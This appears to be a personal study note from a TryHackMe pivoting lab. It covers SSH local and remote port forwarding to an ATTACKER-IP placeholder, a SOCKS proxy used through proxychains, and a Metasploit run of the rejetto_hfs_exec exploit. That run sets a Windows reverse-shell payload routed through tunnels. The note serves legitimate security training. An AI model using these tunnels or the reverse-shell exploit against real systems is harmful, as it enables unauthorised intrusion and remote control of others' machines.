# SSH
### Local (Inwards, towards Attacker PC) Port Forward
This opens up a port on the CLIENT and forwards all traffic to the SERVER. 

Below, and incoming traffic to port 80 on PC-1/SSH-CLIENT will get routed to the SERVER/Attacker on port 80. You are pulling a port from Attacker, to be available for connection on the Client.

Syntax

```
ssh tunneluser@ATTACKER-IP -L *:80:127.0.0.1:80 -N (no interactive shell)
```

In this case, since we are connecting to a SSH-Server that is run on the same device as the one we are forwarding traffic to, we can use 127.0.0.1
![[Pasted image 20220724145526.png]]

### Remote (Outward, away from Attacker PC) Port Forward 

This forwards all connections from the Attacker PC, to the Server, THROUGH PC-1/SSH client

Syntax

```
ssh tunneluser@ATTACKER-IP -R INTERIM_PORT:TARGET_IP:TARGET_PORT
```
![[Pasted image 20220724145534.png]]
### SOCKS Proxy

Runs on client/intermediary PC. Opens port 9050 on server.

```
ssh tunneluser@1.1.1.1 -R 9050 -N 
```

*Proxychains.conf* (can create one per directory)

```
socks4 127.0.0.1.9050 
```

Example usage

```shell-session
proxychains curl http://pxeboot.za.tryhackme.com
```

### Metasploit & Complex Exploits 

```
msf6 > use rejetto_hfs_exec 
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp 

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com <- Connection address passed in exploit
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1 <- Actual address listenering for connection. Port forwarding user to route the LHOST to the BindAddress.

msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777 

msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666 

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1 
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888 
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```